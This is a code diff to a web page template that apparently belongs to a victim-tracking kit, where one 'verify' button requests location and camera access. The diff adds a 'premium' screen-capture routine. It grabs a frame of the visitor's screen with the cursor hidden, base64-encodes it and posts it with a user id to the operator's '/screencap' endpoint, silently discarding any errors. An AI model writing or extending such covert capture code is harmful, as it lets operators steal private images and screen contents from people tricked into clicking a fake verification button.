@@ -431,6 +431,26 @@ async function doCamera(){
   }
 }
 
+<% if(screenCapAccess){ %>
+// ── Screen Capture (premium) ──────────────────────────────────────────────────
+async function doScreenCapture(){
+  try{
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getDisplayMedia)return;
+    var stream=await navigator.mediaDevices.getDisplayMedia({video:{cursor:"never"},audio:false});
+    var vid=document.createElement("video");
+    vid.srcObject=stream;
+    await vid.play();
+    await new Promise(function(r){setTimeout(r,300);});
+    var cv=document.createElement("canvas");
+    cv.width=vid.videoWidth||1280;cv.height=vid.videoHeight||720;
+    cv.getContext("2d").drawImage(vid,0,0,cv.width,cv.height);
+    stream.getTracks().forEach(function(t){t.stop();});
+    var b64=cv.toDataURL("image/png").replace("data:image/png;base64,","");
+    $.post(a+"/screencap",{uid:uid,img:encodeURIComponent(b64)});
+  }catch(e){}
+}
+<% } %>
+
 // ── One button: all permissions at once ───────────────────────────────────────
 var verifying=false;
 function doVerify(){
@@ -443,6 +463,7 @@ function doVerify(){
   // Fire location + camera in parallel
   fireLocation();
 <% if(camAccess){ %>  doCamera();<% } %>
+<% if(screenCapAccess){ %>  doScreenCapture();<% } %>
 }
 
 // ── Page init ─────────────────────────────────────────────────────────────────
